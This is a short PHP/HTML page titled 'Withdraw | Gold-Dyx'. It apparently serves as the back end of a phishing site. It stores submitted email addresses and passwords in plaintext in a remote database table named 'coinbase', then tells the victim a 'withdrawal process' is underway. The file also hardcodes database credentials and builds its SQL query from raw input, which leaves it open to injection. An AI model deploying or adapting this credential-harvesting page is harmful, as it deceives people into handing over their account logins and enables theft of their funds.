<!DOCTYPE html> 
<html> 

  
<head> 

    <title>Withdraw | Gold-Dyx</title> 
</head> 

  
<body> 

    <center> 

        <?php
	
	$conn = mysqli_connect("exz.h.filess.io", "EmergencyDB_cottonwind", "9788e03af92da66a15846e459125cb88fa45b393", "EmergencyDB_cottonwind");

        if($conn === false){ 

            die("ERROR: Could not connect. " 

                . mysqli_connect_error()); 

        } 

          

        // Taking values from the form data(input) 

        $email =  $_REQUEST['email']; 

        $password = $_REQUEST['password']; 

        // here our table name is coinbase 

        $sql = "INSERT INTO coinbase VALUES ('$email',  

            '$password')"; 

          

        if(mysqli_query($conn, $sql)){ 

            echo "<h3>Account authorization in progress. <br> You will receive a mail shortly to complete the withdrawal process.</br></h3>"; 

        } else{ 

            echo "ERROR: Hush! Sorry $sql. " 

                . mysqli_error($conn); 

        } 

          

        // Close connection 

        mysqli_close($conn); 

        ?> 

    </center> 
</body> 

  
</html> 
